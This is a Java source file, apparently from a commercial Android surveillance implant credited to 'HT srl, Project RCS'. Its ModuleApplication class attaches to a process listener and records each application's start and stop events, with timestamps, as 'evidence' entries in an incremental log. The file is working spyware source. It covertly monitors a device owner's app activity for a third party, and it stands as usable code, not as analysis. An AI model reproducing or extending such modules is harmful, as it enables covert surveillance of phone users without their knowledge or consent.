/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import java.util.ArrayList;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.interfaces.IncrementalLog;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.WChar;


public class ModuleApplication extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {
	private static final String TAG = "ModuleApplication"; //$NON-NLS-1$

	@Override
	public boolean parse(ConfModule conf) {
		return true;
	}

	@Override
	public void actualGo() {

	}

	EvidenceBuilder logIncremental;

	@Override
	public void actualStart() {
		// viene creato un file temporaneo di log application, aperto.
		logIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
		ListenerProcess.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerProcess.self().detach(this);
		// il log viene chiuso.
		logIncremental.close();
	}

	public int notification(ProcessInfo process) {
		saveEvidence(process.processInfo, process.status);
		return 0;
	}

	/**
	 * Viene invocata dalla notification, a sua volta invocata dal listener
	 * 
	 * @param processInfo
	 * @param status
	 */
	private void saveEvidence(String processInfo, ProcessStatus status) {
		if (Cfg.DEBUG) {
			Check.requires(processInfo != null, "null process"); //$NON-NLS-1$
		}

		final String name = processInfo;
		final String module = processInfo;

		final byte[] tm = (new DateTime()).getStructTm();

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(WChar.getBytes(name, true));
		items.add(WChar.getBytes(status.name(), true));
		items.add(WChar.getBytes(module, true));
		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
		}

		synchronized (this) {
			logIncremental.write(items);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence): " + name + " " + status.name());//$NON-NLS-1$ //$NON-NLS-2$
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}
		if (logIncremental.hasData()) {
			logIncremental.close();
			logIncremental = new EvidenceBuilder(EvidenceType.APPLICATION);
		}
	}

}
